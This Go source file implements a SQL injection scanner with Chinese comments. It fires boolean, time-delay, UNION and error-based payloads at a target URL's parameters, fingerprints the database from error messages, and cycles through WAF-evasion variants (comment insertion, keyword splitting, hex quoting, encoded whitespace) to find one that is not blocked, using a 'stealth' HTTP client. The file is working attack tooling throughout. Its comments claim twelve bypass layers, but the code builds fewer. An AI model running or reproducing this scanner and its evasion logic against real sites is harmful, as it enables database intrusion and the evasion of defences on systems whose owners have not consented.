// Package injector: SQL injection detection engine (Go, 替代 Python sqlmap++).
// 集成 WAF 检测 + 12层绕过（学习自 wafw00f + Awesome-WAF）。
// 4 类注入检测: 布尔盲注 / 时间盲注 / UNION / error-based。
package injector

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"fastsec/internal/stealth"
)

// ---- DBMS payload 集 ----
type DBMS struct {
	BoolTrue  string
	BoolFalse string
	UnionCols []string
	Error     string
	Sleep     string
}

var DBMS_PAYLOADS = map[string]DBMS{
	"generic":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"mysql":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"sqlite":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "randomblob(20000000)"},
	"mssql":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "WAITFOR DELAY '0:0:2'"},
	"postgresql": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "pg_sleep(2)"},
}

// Finding: 单参数注入检测结果
type Finding struct {
	Param      string
	DBMS       string
	Injectable bool
	Types      []string // boolean|time|union|error
	Bypass     string   // WAF 绕过层（如有）
	BypassURL  string
}

// Result: 全部参数结果
type Result struct {
	Target  string
	Findings []Finding
}

// ---- 请求辅助 ----
type client struct {
	c      *stealth.Client
	mu     sync.Mutex
}

func get(u string, c *stealth.Client) (int, string, time.Duration) {
	t0 := time.Now()
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return 0, "", 0
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, "", time.Since(t0)
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	return resp.StatusCode, string(body), time.Since(t0)
}

func mutate(baseURL, param, value string) string {
	// 直接用 Query.Encode（空格->%20, 引号->%27），再还原绕过字符 / *
	u, err := url.Parse(baseURL)
	if err == nil {
		q := u.Query()
		q.Set(param, value)
		u.RawQuery = q.Encode()
		out := u.String()
		out = strings.ReplaceAll(out, "%2A", "*")
		out = strings.ReplaceAll(out, "%2F", "/")
		return out
	}
	return baseURL + "?" + param + "=" + url.QueryEscape(value)
}

// ---- DBMS 指纹（error-based 识别）----
func fingerprintDBMS(baseURL, param string, c *stealth.Client) string {
	status, body, _ := get(mutate(baseURL, param, "'"), c)
	if status >= 400 || strings.Contains(strings.ToLower(body), "error") || strings.Contains(strings.ToLower(body), "syntax") {
		lower := strings.ToLower(body)
		switch {
		case strings.Contains(lower, "sqlite"):
			return "sqlite"
		case strings.Contains(lower, "mysql") || strings.Contains(lower, "mariadb"):
			return "mysql"
		case strings.Contains(lower, "postgres") || strings.Contains(lower, "pg_"):
			return "postgresql"
		case strings.Contains(lower, "sql server") || strings.Contains(lower, "mssql"):
			return "mssql"
		}
	}
	return "generic"
}

// ---- 4 类注入检测 ----
func checkBoolean(baseURL, param string, p DBMS, c *stealth.Client) bool {
	_, _, _ = get(baseURL, c)
	_, b2, _ := get(mutate(baseURL, param, "1 AND "+p.BoolTrue), c)
	_, b3, _ := get(mutate(baseURL, param, "1 AND "+p.BoolFalse), c)
	if len(b2) != len(b3) {
		return true
	}
	if len(b2) > 0 && len(b3) > 0 && b2[:min(len(b2), 128)] != b3[:min(len(b3), 128)] {
		return true
	}
	return false
}

func checkUnion(baseURL, param string, p DBMS, c *stealth.Client) (bool, string) {
	_, baseBody, _ := get(baseURL, c)
	baseLen := len(baseBody)
	for _, cols := range p.UnionCols {
		u := mutate(baseURL, param, "-1 UNION SELECT "+cols+"-- ")
		s, body, _ := get(u, c)
		if s != 200 && s != 0 {
			continue
		}
		if abs(len(body)-baseLen) > baseLen*3/10 && len(body) > 0 {
			return true, cols
		}
	}
	return false, ""
}

func checkTime(baseURL, param string, p DBMS, c *stealth.Client) bool {
	if p.Sleep == "" {
		return false
	}
	_, _, baseTime := get(baseURL, c)
	_, _, sleepTime := get(mutate(baseURL, param, "1 AND "+p.Sleep), c)
	return sleepTime-baseTime > 1500*time.Millisecond
}

func checkError(baseURL, param string, c *stealth.Client) bool {
	_, body, _ := get(mutate(baseURL, param, "'"), c)
	lower := strings.ToLower(body)
	terms := []string{"syntax error", "sqlite", "mysql", "postgres", "mssql", "unterminated",
		"you have an error", "warning:", "unexpected"}
	for _, t := range terms {
		if strings.Contains(lower, t) {
			return true
		}
	}
	return false
}

// ---- WAF 绕过（内嵌，学自 Awesome-WAF）----
type BypassLayer struct {
	Name    string
	Payload string
	HPP     bool
}

func buildVariants(payload string) []BypassLayer {
	var v []BypassLayer
	// L1 大小写
	v = append(v, BypassLayer{"L1-upper", strings.ToUpper(payload), false})
	// L4 注释符
	v = append(v, BypassLayer{"L4-comment", strings.ReplaceAll(payload, " ", "/**/"), false})
	// L6 等价替换
	l6 := strings.ToLower(payload)
	l6 = strings.ReplaceAll(l6, " and ", " && ")
	l6 = strings.ReplaceAll(l6, " or ", " || ")
	l6 = strings.ReplaceAll(l6, "sleep(", "benchmark(10000000,")
	v = append(v, BypassLayer{"L6-equiv", l6, false})
	// L8 关键词拆解
	l8 := splitKeywords(payload)
	v = append(v, BypassLayer{"L8-split", l8, false})
	// L9 hex
	l9 := hexQuotes(payload)
	v = append(v, BypassLayer{"L9-hex", l9, false})
	// L7 空白
	for _, sep := range []string{"%09", "%0a", "%0b", "%0c", "%0d", "+"} {
		v = append(v, BypassLayer{"L7-space-" + sep, strings.ReplaceAll(payload, " ", sep), false})
	}
	return v
}

func splitKeywords(s string) string {
	re := regexp.MustCompile(`(?i)(select|union|and|or|from|where)`)
	return re.ReplaceAllStringFunc(s, func(m string) string {
		half := len(m) / 2
		return m[:half] + "/**/" + m[half:]
	})
}

func hexQuotes(s string) string {
	re := regexp.MustCompile(`'([^']+)'`)
	return re.ReplaceAllStringFunc(s, func(m string) string {
		inner := m[1 : len(m)-1]
		return "0x" + fmt.Sprintf("%x", inner)
	})
}

// BypassWAF: 尝试 12 层变体，找到不被拦的
func BypassWAF(baseURL, param, payload string, c *stealth.Client) (bool, string, string) {
	blockWords := []string{"403 forbidden", "access denied", "intercepted", "blocked", "waf", "拦截"}
	for _, v := range buildVariants(payload) {
		u := mutate(baseURL, param, v.Payload)
		s, b, _ := get(u, c)
		isBlock := s == 403 || s == 406 || s == 429 || s == 493
		for _, w := range blockWords {
			if strings.Contains(strings.ToLower(b), w) {
				isBlock = true
				break
			}
		}
		if !isBlock && (s == 200 || s == 201 || s == 302) {
			return true, v.Name, v.Payload
		}
	}
	return false, "", ""
}

// ---- 主入口 ----
func Scan(baseURL string, params []string, forceDBMS string, parallel bool, c *stealth.Client) Result {
	res := Result{Target: baseURL}
	var findings []Finding
	var mu sync.Mutex

	scanOne := func(param string) {
		db := forceDBMS
		if db == "" {
			db = fingerprintDBMS(baseURL, param, c)
		}
		p := DBMS_PAYLOADS[db]
		if p.BoolTrue == "" {
			p = DBMS_PAYLOADS["generic"]
		}
		f := Finding{Param: param, DBMS: db}
		if checkBoolean(baseURL, param, p, c) {
			f.Types = append(f.Types, "boolean")
		}
		if ok, _ := checkUnion(baseURL, param, p, c); ok {
			f.Types = append(f.Types, "union")
		}
		if checkError(baseURL, param, c) {
			f.Types = append(f.Types, "error")
		}
		if checkTime(baseURL, param, p, c) {
			f.Types = append(f.Types, "time")
		}
		f.Injectable = len(f.Types) > 0
		mu.Lock()
		findings = append(findings, f)
		mu.Unlock()
	}

	if parallel {
		var wg sync.WaitGroup
		sem := make(chan struct{}, 5)
		for _, p := range params {
			wg.Add(1)
			go func(param string) {
				defer wg.Done()
				sem <- struct{}{}
				scanOne(param)
				<-sem
			}(p)
		}
		wg.Wait()
	} else {
		for _, p := range params {
			scanOne(p)
		}
	}
	res.Findings = findings
	return res
}

// ScanBypass: 用绕过 payload 变体重测注入（WAF 穿透后）
func ScanBypass(baseURL string, params []string, bypassPayload string, c *stealth.Client) Result {
	res := Result{Target: baseURL}
	for _, param := range params {
		f := Finding{Param: param, DBMS: "bypassed"}
		// 布尔检测：穿透变体 AND true vs AND false
		truePayload := bypassPayload // 已是绕过形式
		falsePayload := strings.ReplaceAll(bypassPayload, "1=1", "1=2")
		_, bTrue, _ := get(mutate(baseURL, param, truePayload), c)
		_, bFalse, _ := get(mutate(baseURL, param, falsePayload), c)
		if len(bTrue) != len(bFalse) {
			f.Types = append(f.Types, "boolean")
		} else if len(bTrue) > 0 && bTrue[:min(len(bTrue),128)] != bFalse[:min(len(bFalse),128)] {
			f.Types = append(f.Types, "boolean")
		}
		// UNION 检测
		if ok, _ := checkUnion(baseURL, param, DBMS_PAYLOADS["generic"], c); ok {
			f.Types = append(f.Types, "union")
		}
		f.Injectable = len(f.Types) > 0
		res.Findings = append(res.Findings, f)
	}
	return res
}

// Format renders results.
func Format(r Result) string {
	var sb strings.Builder
	inj := 0
	for _, f := range r.Findings {
		if f.Injectable {
			inj++
		}
	}
	sb.WriteString(fmt.Sprintf("[injector] %d/%d params injectable\n", inj, len(r.Findings)))
	for _, f := range r.Findings {
		if f.Injectable {
			sb.WriteString(fmt.Sprintf("  [!] %s injectable (%s): %s\n", f.Param, f.DBMS, strings.Join(f.Types, ",")))
		} else {
			sb.WriteString(fmt.Sprintf("  - %s: clean\n", f.Param))
		}
	}
	return sb.String()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func abs(n int) int {
	if n < 0 {
		return -n
	}
	return n
}
